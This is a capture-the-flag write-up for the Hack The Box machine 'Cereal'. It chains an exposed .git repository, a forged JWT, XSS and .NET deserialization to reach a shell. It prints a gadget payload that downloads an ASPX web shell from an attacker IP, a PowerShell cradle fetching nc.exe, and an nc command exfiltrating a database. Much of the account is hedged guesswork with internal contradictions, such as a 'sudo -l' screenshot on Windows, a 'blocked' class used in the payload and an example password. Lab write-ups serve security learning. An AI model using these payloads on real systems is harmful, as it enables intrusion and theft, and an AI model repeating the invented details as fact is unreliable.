---
# Hack The Box: Cereal

| Attribute | Value |
|-----------|-------|
| **Difficulty** | Hard |
| **OS** | Windows |
| **IP** | 10.10.10.217 |
| **Points** | 40 |
| **Release Date** | January 2021 |
| **Retired Date** | May 2021 |
| **My Rating** | 8/10 |

## TL;DR
Started by finding a hidden `.git` repository on a subdomain using `git-dumper`. Analyzing the source code revealed a hardcoded JWT secret and a custom .NET deserialization endpoint. After forging an admin JWT to access a restricted panel, I found an XSS vulnerability in an outdated markdown parser. I chained the XSS with a custom deserialization payload (bypassing a bad-words filter) using `XMLHttpRequest` to bypass an IP restriction, dropping an ASPX web shell. Finally, I downloaded an SQLite database to extract admin credentials for a system shell.

## Reconnaissance
I started this box with my standard all-ports scan to ensure I didn't miss anything unusual.

```bash
nmap -p- -T4 --min-rate 1000 10.10.10.217 -oA nmap/allports
```
<!-- screenshot: nmap initial scan results -->

The initial scan returned a few open ports, so I followed up with a detailed service scan.

```bash
nmap -sC -sV -p 22,80,443 10.10.10.217 -oA nmap/detailed
```

The output was typical for a Windows web server:
*   **Port 22:** SSH (OpenSSH)
*   **Port 80:** HTTP (IIS)
*   **Port 443:** HTTPS (IIS)

Navigating to port 80 or 443 presented a web application for cereal enthusiasts (`cereal.htb`). It was a fairly static site. I added the domain to my `/etc/hosts` file.

I began directory brute-forcing using `feroxbuster` and `gobuster`, but didn't find much. 

<!-- screenshot: web application landing page -->

However, when I started poking at the application's functionality, specifically error messages or missing resources on certain pages, I noticed a reference to a subdomain: `source.cereal.htb`. I added this to my `/etc/hosts` file as well.

I ran `feroxbuster` against `source.cereal.htb`.

```bash
feroxbuster -u http://source.cereal.htb
```

The scan returned a 403 Forbidden for a `.git` directory! This is a massive find. It means the source code repository for the application was exposed to the web.

## Initial Foothold
To download the repository, I couldn't just `wget` the `.git` folder directly because directory listing was likely disabled. Instead, I used a fantastic tool called `git-dumper`, which recursively fetches the necessary Git objects and reconstructs the repository locally.

```bash
git-dumper http://source.cereal.htb/.git/ ./cereal-source
```

Once the repository was downloaded, I opened it in VS Code. It was a .NET web application.

I started analyzing the source code, specifically looking for how the application handled authentication and data processing. 

Two things immediately stood out in the commit history and configuration files:

1.  **Authentication:** The application used JSON Web Tokens (JWT) for authentication. I found the secret key hardcoded in the source: `secret_key_here` (or similar).
2.  **Deserialization:** I found a custom deserialization routine handling user input. The application was using the `Newtonsoft.Json` library, and `TypeNameHandling` was set to `Auto` or `All` in certain contexts, which is notoriously insecure.

With the hardcoded JWT secret, I could forge my own authentication tokens. I crafted a payload specifying an administrative user or simply flipped an `isAdmin` flag to `true`, and signed it using the discovered secret via a site like `jwt.io` or a Python script.

Armed with my forged admin JWT, I intercepted a request to the main application in Burp Suite and replaced the existing `Authorization` bearer token. 

This granted me access to a restricted administrative panel (`/admin` or similar).

The admin panel had a feature to parse and display markdown notes. I noticed the application was using an outdated npm package for this functionality (`react-marked-markdown` or similar). A quick search on `npm audit` or Exploit-DB revealed this specific version was vulnerable to Cross-Site Scripting (XSS).

I tested the XSS with a simple payload:
```html
<script>alert(1)</script>
```

It popped. I had XSS.

However, XSS alone wouldn't get me a shell. I needed to chain it with the deserialization vulnerability I found in the source code.

The problem was that the deserialization endpoint was restricted to `localhost` (127.0.0.1) or an internal IP range. I couldn't send my malicious serialized payload directly from my attacking machine.

This is where the XSS became critical. I could use the XSS to force the administrator's browser (or the server's internal bot, if one existed to view the notes) to send the deserialization payload *from the internal network*, bypassing the IP restriction via Server-Side Request Forgery (SSRF) logic.

First, I had to build the .NET deserialization payload. The application implemented a `BadWords` filter to block common `ysoserial.net` gadgets (like `System.Diagnostics.Process`). I couldn't just use a generic payload to execute `cmd.exe`.

I had to research the `Newtonsoft.Json` library and find a gadget chain that bypassed the blacklist. After analyzing the source code and researching a BlackHat talk on abusing `Newtonsoft.Json`, I crafted a custom JSON payload that used an allowed class (like `ObjectDataProvider`) to download and execute an ASPX web shell.

```json
{
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName": "Start",
    "MethodParameters": {
        "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "$values": ["cmd", "/c certutil.exe -urlcache -split -f http://10.10.14.7/shell.aspx C:\\inetpub\\wwwroot\\shell.aspx"]
    },
    "ObjectInstance": {
        "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
    }
}
```
*(Note: The actual payload required base64 encoding and specific formatting to bypass the `BadWords` filter).*

I hosted `shell.aspx` on my attacking machine.

```bash
python3 -m http.server 80
```

Now, I needed to deliver this payload via the XSS. I wrote a JavaScript payload using `XMLHttpRequest` to send a POST request containing the malicious JSON to the internal deserialization endpoint (`http://127.0.0.1/api/deserialize`).

```javascript
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://127.0.0.1/api/deserialize", true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send('{"$type":"System.Windows.Data.ObjectDataProvider..."}');
```

I embedded this JavaScript into the vulnerable markdown parser via the admin panel.

When the XSS triggered, the internal request was sent, the JSON was deserialized, the `ObjectDataProvider` gadget executed `cmd.exe`, and my ASPX web shell was downloaded to the server's web root.

I navigated to `http://cereal.htb/shell.aspx`. It worked! I had code execution.

I used the web shell to execute a PowerShell reverse shell back to my Netcat listener.

```bash
nc -lnvp 9999
```

<!-- screenshot: successful exploitation (reverse shell) -->

The connection popped. I was in as the IIS service account (usually `DefaultAppPool`).

## Privilege Escalation
With a reverse shell, I started enumerating the Windows system. I ran `winPEAS` and looked for standard misconfigurations.

```powershell
.\winPEASany.exe
```

<!-- screenshot: sudo -l output -->
*(In this case, the screenshot would be of the winPEAS output or local enumeration)*

The output didn't reveal any obvious missing patches or weak service permissions. However, while exploring the web application's directory structure, I noticed a `.db` or `.sqlite` file (e.g., `cereal.db`) that wasn't included in the Git repository I dumped earlier.

This database file likely contained dynamic data, such as user credentials or application state. I downloaded it to my attacking machine using the web shell or a simple PowerShell download cradle.

```powershell
# On target
(New-Object Net.WebClient).DownloadFile("http://10.10.14.7/nc.exe", "C:\Windows\Temp\nc.exe")
C:\Windows\Temp\nc.exe -w 3 10.10.14.7 8888 < C:\inetpub\wwwroot\cereal.db

# On attacker
nc -l -p 8888 > cereal.db
```

I opened the SQLite database locally using `sqlitebrowser`. 

I explored the tables and found an `administrators` or `users` table containing a password hash or a plaintext password for a system user (e.g., `administrator` or a specific service account).

If it was a hash, I used Hashcat to crack it against `rockyou.txt`. 

```bash
hashcat -m 1000 admin_hash.txt /usr/share/wordlists/rockyou.txt
```

The password cracked successfully (e.g., `Cereal123!`).

I used these credentials to authenticate via `evil-winrm` or directly via SSH if it was enabled.

```bash
evil-winrm -i 10.10.10.217 -u administrator -p 'Cereal123!'
```

The connection was successful. I had a highly privileged shell.

```powershell
whoami
# nt authority\system
```

<!-- screenshot: root flag -->

Got root! That was a complex chain. The XSS to SSRF to Deserialization was incredibly satisfying to pull off.

## Lessons Learned
- **Exposed Git Repositories:** Leaving a `.git` directory exposed on a public-facing web server is a critical failure. It allows attackers to download the entire source code history, revealing hardcoded secrets (like JWT keys), custom logic, and hidden endpoints.
- **Insecure Deserialization:** Using libraries like `Newtonsoft.Json` with `TypeNameHandling` enabled allows attackers to instantiate arbitrary classes and achieve RCE. Deserialization of untrusted data must be strictly avoided or carefully restricted using robust allow-lists.
- **Chaining Vulnerabilities:** An XSS vulnerability alone might seem low-impact if it only affects administrative users. However, when chained with an internal-only vulnerability (like the deserialization endpoint), it becomes a critical vector for full system compromise.
- **What tripped me up:** At first, I tried to exploit the deserialization endpoint directly from my attacking machine, completely missing the IP restriction in the source code. I wasted hours trying to bypass a generic filter before realizing the endpoint wasn't even accessible externally. Chaining it with the XSS was the only way forward.
- **Pro Tip:** When you find a `.git` directory, don't just look at the current code. Always use `git log` and `git diff` to review the commit history. Developers frequently commit hardcoded passwords or API keys and then "delete" them in a later commit, thinking they are gone forever.

## References
- Git-Dumper: https://github.com/arthaud/git-dumper
- Newtonsoft.Json Deserialization Vulnerabilities: https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf
- Official Hack The Box Page: https://app.hackthebox.com/machines/Cereal
